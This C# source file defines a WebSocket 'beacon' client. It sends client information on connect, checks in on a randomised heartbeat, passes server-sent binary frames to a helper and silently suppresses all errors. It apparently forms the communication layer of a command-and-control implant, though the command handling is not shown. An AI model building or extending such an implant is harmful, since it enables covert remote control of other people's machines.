using Beacon.Helper;
using System;
using System.Threading;
using WebSocketSharp;

namespace Beacon
{
	internal class WebSocketBeacon
	{
		private WebSocket _ws;
		private System.Timers.Timer _heartbeatTimer;
		private volatile bool _connected;

		public bool Start(string url)
		{
			try
			{
				_ws = new WebSocket(url);
				_ws.Compression = CompressionMethod.Deflate;
				_ws.Origin = "https://example.com";
				// 使用默认的协议集合，避免旧框架下的枚举缺失

				_ws.OnOpen += (s, e) =>
				{
					_connected = true;
					try { var first = BeaconHandle.BuildClientInfo(); _ws.Send(first); } catch { }
					_heartbeatTimer = new System.Timers.Timer(new Random().Next(20000, 30000));
					_heartbeatTimer.AutoReset = true;
					_heartbeatTimer.Elapsed += (_, __) => { try { BeaconHandle.KeepAlive(b => _ws.Send(b)); } catch { } };
					_heartbeatTimer.Start();
				};

				_ws.OnMessage += (s, e) =>
				{
					if (!e.IsBinary) return;
					try { BeaconHandle.OnFrame(b => _ws.Send(b), e.RawData); } catch { }
				};

				_ws.OnClose += (s, e) =>
				{
					_connected = false;
					try { _heartbeatTimer?.Stop(); } catch { }
					try { _heartbeatTimer?.Dispose(); } catch { }
				};

				_ws.OnError += (s, e) =>
				{
					_connected = false;
					try { _heartbeatTimer?.Stop(); } catch { }
					try { _heartbeatTimer?.Dispose(); } catch { }
				};

				_ws.Connect();
				return _connected;
			}
			catch
			{
				return false;
			}
		}

		public void Stop()
		{
			try { _heartbeatTimer?.Stop(); } catch { }
			try { _heartbeatTimer?.Dispose(); } catch { }
			try { _ws?.Close(); } catch { }
		}

	}
}
